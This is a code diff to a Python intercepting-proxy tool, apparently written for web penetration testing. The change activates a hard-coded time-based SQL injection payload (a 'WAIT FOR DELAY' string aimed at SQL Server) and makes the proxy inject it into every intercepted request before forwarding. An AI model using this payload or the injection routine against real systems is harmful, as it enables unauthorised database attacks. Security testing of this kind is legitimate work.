@@ -350,7 +350,7 @@ class ProxyWorker(threading.Thread):
 
     def _do_inject_before_send_upstream(self, tx_request_raw):
         payload = b"DEAD'; WAIT FOR DELAY '0:0:10';-- -"
-        payload = b"REPLACEME123"
+        # payload = b"REPLACEME123"
         payload_len = len(payload)
 
         data = bytearray(tx_request_raw)  # work on bytes
@@ -469,7 +469,8 @@ class ProxyWorker(threading.Thread):
         fl = req.split(b'\r\n', 1)[0].decode(errors='ignore')
         parts = fl.split()
         method, path = (parts[0], parts[1]) if len(parts) >= 2 else ("-", "-")
-        tx = Transaction(id=txid, host=host, port=port, request_raw=req,
+        tx_request_raw = self._do_inject_before_send_upstream(req)
+        tx = Transaction(id=txid, host=host, port=port, request_raw=tx_request_raw,
                          request_method=method, request_path=path)
 
         self.gui_queue.put(("new_tx", tx))
@@ -482,7 +483,6 @@ class ProxyWorker(threading.Thread):
             tx.request_event.wait()
 
         # Send upstream
-        tx_request_raw = self._do_inject_before_send_upstream(tx.request_raw)
         upstream.sendall(tx_request_raw)
 
         # Read response
@@ -533,7 +533,8 @@ class ProxyWorker(threading.Thread):
             parts = fl.split()
             method, path = (parts[0], parts[1]) if len(parts) >= 2 else ("-", "-")
 
-            tx = Transaction(id=txid, host=host, port=port, request_raw=req,
+            tx_request_raw = self._do_inject_before_send_upstream(req)
+            tx = Transaction(id=txid, host=host, port=port, request_raw=tx_request_raw,
                              request_method=method, request_path=path)
             self.gui_queue.put(("new_tx", tx))
 
@@ -544,7 +545,6 @@ class ProxyWorker(threading.Thread):
                 tx.request_event.wait()
 
             try:
-                tx_request_raw = self._do_inject_before_send_upstream(tx.request_raw)
                 upstream.sendall(tx_request_raw)
             except Exception:
                 break
